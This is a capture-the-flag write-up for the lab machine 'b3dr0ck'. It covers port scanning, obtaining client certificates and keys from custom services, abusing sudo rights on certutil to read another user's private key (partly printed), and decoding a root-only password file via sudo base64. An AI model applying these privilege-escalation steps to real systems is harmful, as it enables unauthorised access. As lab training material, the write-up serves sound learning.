{% from "macros.html" import console, image, text, code, list, link, header, script, imageModal %}

{{imageModal()}}

{{header("Enumeration", "enumeration")}}

{{text("We begin with port scanning.")}}

{{console("nmap -T5 -p- 10.10.222.234", "Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-13 01:53 CET
Warning: 10.10.222.234 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.222.234
Host is up (0.081s latency).
Not shown: 65530 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http         nginx 1.18.0 (Ubuntu)
4040/tcp  open  ssl/yo-main?
9009/tcp  open  pichat?
54321/tcp open  ssl/unknown")}}

{{text("We find 5 open ports:")}}

{{list(['22 (SSH)', '80 (HTTP)', '4040 (yo-main)', '9009 (pichat)', '54321'])}}

{{text("We should investigate these ports further.")}}

{{header("Shell as barney", "shell-as-barney")}}

{{text("Let's begin with the web page.")}}

{{text("We get redirected to port <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>4040</code> with the following message.")}}

{{image("../../static/writeups/b3dr0ck/images/000001.jpg")}}

{{text("Then I used <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>nc</code> command to connect to the service on port 9009.")}}

{{image("../../static/writeups/b3dr0ck/images/000002.jpg")}}

{{text("Since the page mentioned securing connections with certificates, I typed that in and got a certificate.")}}

{{text("It is mentioned it's a service for recovering keys as well. You can type <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>key</code> as well to get a private key.")}}

{{text("If you type in <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>help</code>, you get a command you are supposed to use to connect to the service at port 54321.")}}

{{text("I saved the certification and the key into files and used the command.")}}

{{text("We got a password.")}}

{{image("../../static/writeups/b3dr0ck/images/000003.jpg")}}

{{text("We now can log in as user <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>barney</code> via SSH by using this password.")}}

{{header("Shell as fred", "shell-as-fred")}}

{{text("Since we got the password, I started off by checking our sudo privilages.")}}

{{console("sudo -l", "Matching Defaults entries for barney on b3dr0ck:
    insults, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User barney may run the following commands on b3dr0ck:
    (ALL : ALL) /usr/bin/certutil")}}

{{text("Seemed like we can run <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>certutil</code> as root. I used it and found certificates and keys for other users.")}}

{{console("certutil ls", "Current Cert List: (/usr/share/abc/certs)
------------------
total 56
drwxrwxr-x 2 root root 4096 Apr 30  2022 .
drwxrwxr-x 8 root root 4096 Apr 29  2022 ..
-rw-r----- 1 root root  972 Dec 13 00:44 barney.certificate.pem
-rw-r----- 1 root root 1678 Dec 13 00:44 barney.clientKey.pem
-rw-r----- 1 root root  894 Dec 13 00:44 barney.csr.pem
-rw-r----- 1 root root 1674 Dec 13 00:44 barney.serviceKey.pem
-rw-r----- 1 root root  976 Dec 13 00:44 fred.certificate.pem
-rw-r----- 1 root root 1678 Dec 13 00:44 fred.clientKey.pem
-rw-r----- 1 root root  898 Dec 13 00:44 fred.csr.pem
-rw-r----- 1 root root 1674 Dec 13 00:44 fred.serviceKey.pem")}}

{{text("I was able to read these files by using the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>-a</code> flag.")}}

{{console("sudo certutil -a fred.certificate.pem", "Generating credentials for user: a (fredcertificatepem)
Generated: clientKey for a: /usr/share/abc/certs/a.clientKey.pem
Generated: certificate for a: /usr/share/abc/certs/a.certificate.pem
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAqkl6xhhp/COIAXfwpwYs5BpH18MKf0FYSVmxXgjvgl+lNxdN
O+GyVH9OfTNpmMHYjH1PlETgg1eO2ZXToF7GSXrSvX2sL6ZSoJBpXOJ03DYVAOat
YaBDT/U46sK5hex44WxGCJNhC1HNPg16SHetED32frw23USQothmnba1J5gbWOhV
Gk0/NMGxGYeYpLiUA6y8ksRNyhOB8ngDg522XK+ujMJDGgGZqEX4PWQF8Fr4CqSm
...")}}

{{text("We once again save those into files and use the service on port 54321 to get user's <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>fred</code> password.")}}

{{header("Shell as root", "shell-as-root")}}

{{text("We once again have a password so let's check our sudo privilages.")}}

{{console("sudo -l", "Matching Defaults entries for fred on b3dr0ck:
    insults, env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User fred may run the following commands on b3dr0ck:
    (ALL : ALL) NOPASSWD: /usr/bin/base32 /root/pass.txt
    (ALL : ALL) NOPASSWD: /usr/bin/base64 /root/pass.txt")}}

{{text("We can run <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>base64</code> on the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>pass.txt</code> file as root.")}}

{{text("What we need to do is to use a combination of base64 and base32 decoding to get a valid looking string.")}}
    
{{console("sudo /usr/bin/base64 /root/pass.txt | base64 -d | base32 -d | base64 -d", "[REDACTED]")}}

{{text("We get a string that looks like a hash. We can use <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>hashes.com</code> to get the password.")}}

{{image("../../static/writeups/b3dr0ck/images/000004.jpg")}}

{{text("Now we use this password to switch to root and get the last flag.")}}

{{image("../../static/writeups/b3dr0ck/images/000005.jpg")}}

{{script()}}